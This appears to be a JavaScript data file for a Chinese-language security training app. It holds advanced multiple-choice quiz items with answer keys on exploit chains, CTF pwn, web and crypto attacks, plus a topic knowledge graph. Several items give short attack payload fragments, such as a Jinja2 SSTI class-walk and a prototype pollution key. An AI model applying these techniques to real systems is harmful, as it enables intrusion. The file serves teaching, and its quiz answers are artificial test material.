  { id:"av19", cat:"binary", level:"高级", q:"一个典型的浏览器利用链顺序是？", options:["渲染进程漏洞(RCE)→沙箱逃逸→提权到系统","提权→沙箱逃逸→RCE","反序三步","仅 XSS"], answer:0, explain:"先在被攻击进程拿代码执行，再逃逸沙箱、提权，形成完整链。", hint:"先在渲染进程拿代码执行，再逃沙箱。" },
  { id:"av20", cat:"pentest", level:"高级", q:"Web 应用 RCE → 域控 的常见链是？", options:["Web RCE 读凭据→Pass-the-Hash/票据→Kerberoasting→域控","直接 XSS","仅 SQL 注入","仅钓鱼"], answer:0, explain:"从主机落到身份，再用 Windows 认证链横向到域控。", hint:"从“机”到“身份”再到“域”。" },
  { id:"av21", cat:"pentest", level:"高级", q:"钓鱼邮件→内网横向 的下一步通常是？", options:["在主机落 C2 信标→侦察→凭据窃取→横向移动","直接 DDoS","仅发勒索信","关闭防火墙"], answer:0, explain:"先建立据点(foothold)，再在内网扩展与移动。", hint:"先 establish foothold 再 move。" },
  { id:"av22", cat:"pentest", level:"高级", q:"利用链中“沙箱逃逸”的作用是？", options:["突破渲染/低权限容器限制，获更高权限与更广访问","提速","压缩","加密"], answer:0, explain:"不逃逸则攻击停留在受限进程，无法进一步控制主机。", hint:"否则只在受限进程内。" },
  { id:"av23", cat:"pentest", level:"高级", q:"阻断利用链最有效的方法通常是？", options:["在链的某一环做检测/加固，使其断裂","只打补丁最后一步","只告警","只加密"], answer:0, explain:"链只要断任一环节就整体失效，纵深防御即此意。", hint:"链只要断一环就失效。" },
  { id:"av24", cat:"pentest", level:"高级", q:"“左移”防御利用链的思路是？", options:["在开发/构建期消除漏洞根源，减少可被利用的起点","只靠 WAF","只靠 EDR","只靠审计日志"], answer:0, explain:"减少可被利用的环节数，比事后拦截更根本。", hint:"减少可被利用的环节数。" },
  { id:"av25", cat:"pentest", level:"高级", q:"持久化(persistence)在利用链中的位置？", options:["提权/立足之后，保证能重新进入","第一步","仅侦察阶段","报告阶段"], answer:0, explain:"拿到权限后建立后门，保证失陷主机可被再次访问。", hint:"在拿到权限后建立“后门”。" },
  { id:"av26", cat:"web", level:"高级", q:"针对“SSRF→云元数据→临时凭证”链，防御应？", options:["禁止实例访问元数据/启用 IMDSv2/网络隔离","只用 HTTPS","加 WAF","更换密码"], answer:0, explain:"断掉“拿凭证”这一环（强制 PUT 令牌、禁止链路本地访问）。", hint:"断掉“拿凭证”这一环。" },
  { id:"av27", cat:"pentest", level:"高级", q:"利用链分析里“攻击面(attack surface)”指？", options:["所有可达且可被滥用入口的集合，链往往从这些入口开始","仅开放端口","仅网页","仅 API"], answer:0, explain:"入口越多，链越容易起手；收敛攻击面是降风险的关键。", hint:"入口越多链越容易起。" },
  { id:"av28", cat:"pentest", level:"高级", q:"红队评估利用链时关注“爆破半径(blast radius)”是为了？", options:["评估单点失陷后的影响范围，优先修复高杠杆环节","提速","压缩","加密"], answer:0, explain:"判断哪个环节最致命，优先加固以缩短潜在影响。", hint:"判断哪个环节最致命。" },
  { id:"av29", cat:"pentest", level:"高级", q:"防御利用链时“最小权限(least privilege)”的作用是？", options:["让单点失陷难以横向/提权，缩短链","提速","压缩","加密"], answer:0, explain:"即使某一环被突破，缺乏额外权限也让后续链难以延续。", hint:"让单点失陷难以横向/提权。" },
  { id:"av30", cat:"pentest", level:"高级", q:"利用链里“信任边界(trust boundary)穿越”意味着？", options:["数据/控制流跨过本不应跨的安全域，常是链的转折点","仅网络层","仅网页","仅 API"], answer:0, explain:"一旦越界，后续往往可用目标身份做更多事，是链的关键转折。", hint:"跨过本不应跨的安全域。" },
  // ---- 高级 · CTF 专项(pwn/web/crypto/reverse/misc) ----
  { id:"av31", cat:"binary", level:"高级", q:"64 位程序开启 NX+PIE+Canary+FULL RELRO，存在格式化字符串泄露与栈溢出，正确思路？", options:["先用格式化串泄露 libc 基址与 canary，再用 ROP(ret2libc)拿 shell","直接覆盖 GOT","直接跳 system","无需任何泄露"], answer:0, explain:"FULL RELRO 下 GOT 只读不可改，只能靠泄露地址后 ROP 调用 libc 函数。", hint:"FULL RELRO 不能改 GOT，靠 ROP。" },
  { id:"av32", cat:"binary", level:"高级", q:"ret2csu 在 64 位利用中用于？", options:["利用 __libc_csu_init 的 gadget 设置寄存器后调用任意函数","加密","压缩","提速"], answer:0, explain:"当找不到直接 gadget 时，可借这段通用 gadget 布置 rdi/rsi/rdx 等再 call。", hint:"找不到直接 gadget 时借这段通用 gadget。" },
  { id:"av33", cat:"binary", level:"高级", q:"tcache poisoning 的目标是？", options:["制造重叠块以覆写 __free_hook/目标指针实现任意写","提速","压缩","加密"], answer:0, explain:"通过构造重复节点，使 free 后写入的地址可控，从而改写关键函数指针。", hint:"控制 free 后写入的地址。" },
  { id:"av34", cat:"binary", level:"高级", q:"给定“使用后才释放”的 UAF，常见做法是？", options:["释放后保留指针，再次分配同尺寸块复用该内存改结构","立即置空指针","不利用","只读不改"], answer:0, explain:"复用已释放块可控制其中的类型/函数指针，造成类型混淆或劫持。", hint:"复用已释放块控制类型/函数指针。" },
  { id:"av35", cat:"web", level:"高级", q:"Jinja2 SSTI 读 flag 常用思路？", options:["借 `''.__class__.__mro__[1].__subclasses__()` 找到危险类(如 subprocess/os)执行命令","直接读文件","XSS","CSRF"], answer:0, explain:"从基础类型向上找可调用危险方法的类，进而执行系统命令。", hint:"从基础类型向上找可调用危险方法的类。" },
  { id:"av36", cat:"web", level:"高级", q:"PHP `==` 类型杂耍(type juggling)可导致？", options:["`0e123==0e999` 判等为真，绕过哈希/认证校验","提速","压缩","加密"], answer:0, explain:"数字字符串按数值比较，散列值恰为 0e… 时被当作 0 相等。", hint:"数字字符串按数值比较。" },
  { id:"av37", cat:"web", level:"高级", q:"原型链污染(prototype pollution)利用？", options:["覆写 Object.prototype 属性(如 __proto__.isAdmin=true)影响逻辑判定","XSS","CSRF","SQL 注入"], answer:0, explain:"通过 `.__proto__` 等键写进全局原型，影响后续所有对象的属性读取。", hint:"通过 `.__proto__` 等键写进全局原型。" },
  { id:"av38", cat:"web", level:"高级", q:"CTF 中“竞争条件”常用于？", options:["并发触发“先检查后使用”的兑换/上传/抽奖逻辑","提速","压缩","加密"], answer:0, explain:"在检查与使用之间插队，使越权状态成立。", hint:"在检查与使用之间插队。" },
  { id:"av39", cat:"web", level:"高级", q:"Java 反序列化 gadget chain(如 CommonsCollections)目的？", options:["通过可控属性链最终调用 Runtime.exec 实现 RCE","只读取","只存储","只加密"], answer:0, explain:"反序列化时自动调用 setter/读属性触发链条，末端执行命令。", hint:"反序列化时自动调用触发链，末端执行命令。" },
  { id:"av40", cat:"crypto", level:"高级", q:"同一明文用相同小公钥指数 e 对多个不同模数 N 加密(广播)，可用？", options:["中国剩余定理(CRT/Håstad)恢复明文","MD5","XSS","AES"], answer:0, explain:"同消息多模数下，联立同余可在不知私钥时解出明文（Håstad 广播攻击）。", hint:"同消息多模数 → 联立同余。" },
  { id:"av41", cat:"crypto", level:"高级", q:"CTR 模式两密文 nonce 相同且已知其中一份明文，可？", options:["异或两份密文得两份明文异或，再结合已知明文恢复另一份","无解","提速","压缩"], answer:0, explain:"流密码 keystream 复用 = 明文异或，已知一份即可解另一份。", hint:"流密码 keystream 复用 = 明文异或。" },
  { id:"av42", cat:"crypto", level:"高级", q:"ECB cut-and-paste 利用前提是？", options:["明文结构已知且按固定块对齐，可复制已知密文块拼接到自己数据","随机 IV","AEAD","流式加密"], answer:0, explain:"相同明文块=相同密文块，可像拼图一样重组出权限提升的密文。", hint:"相同明文块=相同密文块。" },
  { id:"av43", cat:"crypto", level:"高级", q:"padding oracle 在 CTF 中逐字节恢复需？", options:["从末块往前逐字节调整 IV 使填充为 0x01/0x02… 观察响应差异","提速","压缩","加密"], answer:0, explain:"利用填充校验是否正确的“预言机”逐字节反推明文。", hint:"利用填充校验是否正确的“预言机”。" },
  { id:"av44", cat:"crypto", level:"高级", q:"hash 长度扩展攻击(MD5/SHA1/SHA2)要求已知？", options:["原消息长度与原哈希(无需原消息内容)，即可在其后追加计算新哈希","明文","密钥","IV"], answer:0, explain:"Merkle-Damgård 压缩状态可接续，已知长度与哈希即可算 extension。", hint:"Merkle-Damgård 状态可接续。" },
  { id:"av45", cat:"binary", level:"高级", q:"逆向中 anti-debug 常见手段？", options:["ptrace 自检/定时器/断点检测阻止动态调试","只加密","只压缩","只提速"], answer:0, explain:"检测自身是否被调试，命中则走错误分支或退出。", hint:"检测自己是否被调试。" },
  { id:"av46", cat:"binary", level:"高级", q:"flag 常隐藏方式是？", options:["硬编码字符串/资源/需还原的编码常量(xor/Base64)","明文显示在标题","仅日志","仅网络"], answer:0, explain:"常需解码/还原（xor、Base64、自定义算法）才能拿到 flag。", hint:"需要解码/还原才能拿到。" },
  { id:"av47", cat:"pentest", level:"高级", q:"ReDoS 指？", options:["恶意正则灾难性回溯导致服务不可用(DoS)","加密弱","XSS","SQL 注入"], answer:0, explain:"嵌套量词叠加导致指数级回溯，构造输入即可打挂服务。", hint:"嵌套量词叠加导致指数级回溯。" },
  { id:"av48", cat:"pentest", level:"高级", q:"源码泄露如 .git 目录暴露可？", options:["恢复历史提交中的源码/密钥","只影响样式","仅日志","无影响"], answer:0, explain:".git 含完整版本历史，可翻出旧版漏洞与泄露的凭据。", hint:".git 含完整版本历史。" }
  ]
};

/* ============================================================
   v1.1.0 知识图谱（AGENT-DESIGN 第 2 节第 3 条）：74 个知识点上的
   「前置 / 并列 / 进阶」依赖边，用于「学 A 前先补 B」的诊断与计划。
   - prereq:   学 key 之前建议先补 to 数组中的知识点
   - advanced: 学完 key 之后可深入 to 数组中的知识点
   - peer:     key 与 to 并列（同类可替代 / 组合学习）
   仅登记知识体系内的 id；未知 id 由 app.js 建索引时过滤。
   ============================================================ */
SEC_DATA.knowledge_graph = {
  prereq: {
    // —— web ——
    sqli: ["net-proto"], xss: ["net-proto", "auth"], csrf: ["auth", "xss"],
    ssrf: ["net-proto", "lfi"], upload: ["lfi"], cmdinj: ["net-proto"],
    deser: ["cmdinj"], auth: ["sym", "hash"], xxe: ["lfi", "ssrf"],
    jwt: ["auth", "asym"], clickjack: ["auth"], cors: ["net-proto"],
    lfi: ["net-proto"], ssti: ["cmdinj"], idor: ["auth"],
    "api-sec": ["auth", "jwt"], smuggling: ["net-proto"], "proto-poll": ["deser"],
    graphql: ["api-sec", "idor"], "cache-poison": ["smuggling", "net-proto"],
    // —— binary ——
    heap: ["stack"], fmt: ["stack"], rop: ["stack", "mitigations"],
    sandbox: ["rop", "mitigations"], mitigations: ["stack"], uaf: ["heap"],
    "av-bypass": ["sandbox"],
    // —— crypto ——
    asym: ["sym"], hash: ["sym"], rand: ["sym"], ecc: ["asym"],
    tls: ["asym", "sym", "blockmode"], pqc: ["asym", "ecc"],
    blockmode: ["sym"], pki: ["asym", "hash"], "crypto-misuse": ["rand", "hash"],
    "side-channel": ["sym", "asym"],
    // —— pentest ——
    recon: ["net-proto"], scan: ["recon", "port-scan"], privesc: ["scan"],
    lateral: ["privesc"], report: ["scan"], oauth: ["auth", "jwt"],
    cloud: ["iam"], ad: ["lateral"], osint: ["recon"], "priv-esc": ["scan"],
    // —— network ——
    "port-scan": ["net-proto"], "arp-dns": ["net-proto"],
    "net-lateral": ["arp-dns"], "ad-pentest": ["net-lateral"], "fw-bypass": ["port-scan", "ids"],
    // —— cloud ——
    iam: ["shared-resp"], "container-escape": ["sandbox", "iam"],
    k8s: ["container-escape", "iam"], serverless: ["iam", "metadata"], metadata: ["iam", "ssrf"],
    // —— blue ——
    ids: ["net-proto", "siem"], traffic: ["ids", "siem"],
    ir: ["siem", "edr"], "threat-intel": ["traffic"], edr: ["siem"],
  },
  advanced: {
    stack: ["rop", "heap", "fmt"], heap: ["uaf"], mitigations: ["rop", "sandbox"],
    sym: ["blockmode", "tls"], asym: ["tls", "pki", "ecc"], hash: ["pki"],
    rand: ["crypto-misuse"], blockmode: ["tls"], auth: ["jwt", "oauth"],
    lfi: ["xxe"], sqli: ["deser"], recon: ["scan", "osint"],
    scan: ["privesc"], privesc: ["lateral"], lateral: ["ad"],
    "net-proto": ["arp-dns", "port-scan"], "port-scan": ["fw-bypass"],
    "arp-dns": ["net-lateral"], "net-lateral": ["ad-pentest"],
    "shared-resp": ["iam"], iam: ["metadata", "k8s"], "container-escape": ["k8s"],
    siem: ["ids", "edr"], ids: ["traffic"], traffic: ["threat-intel"], ir: ["threat-intel"],
  },
  peer: {
    sqli: ["xss", "cmdinj"], xss: ["csrf", "sqli"], csrf: ["cors", "clickjack"],
    cmdinj: ["ssti", "deser"], ssti: ["xxe", "deser"], xxe: ["ssti", "ssrf"],
    cors: ["csrf"], idor: ["api-sec"], "proto-poll": ["deser"],
    // 同义/重复主题互连：可互为替代
    intovf: ["int-overflow"], "int-overflow": ["intovf"],
    race: ["toctou"], toctou: ["race"], fuzz: ["fuzzing"], fuzzing: ["fuzz"],
    privesc: ["priv-esc"], "priv-esc": ["privesc"],
    ad: ["ad-pentest"], "ad-pentest": ["ad"], lateral: ["net-lateral"], "net-lateral": ["lateral"],
    heap: ["fmt"], fmt: ["heap"], uaf: ["race"],
    sym: ["asym"], asym: ["sym"], hash: ["rand"], rand: ["hash"],
    "crypto-misuse": ["side-channel"], "side-channel": ["crypto-misuse"],
    recon: ["port-scan", "osint"], osint: ["social"], social: ["osint"],
    "threat-intel": ["osint"], metadata: ["ssrf"], ssrf: ["metadata"],
    ids: ["edr", "fw-bypass"], edr: ["ids"],
  }
};
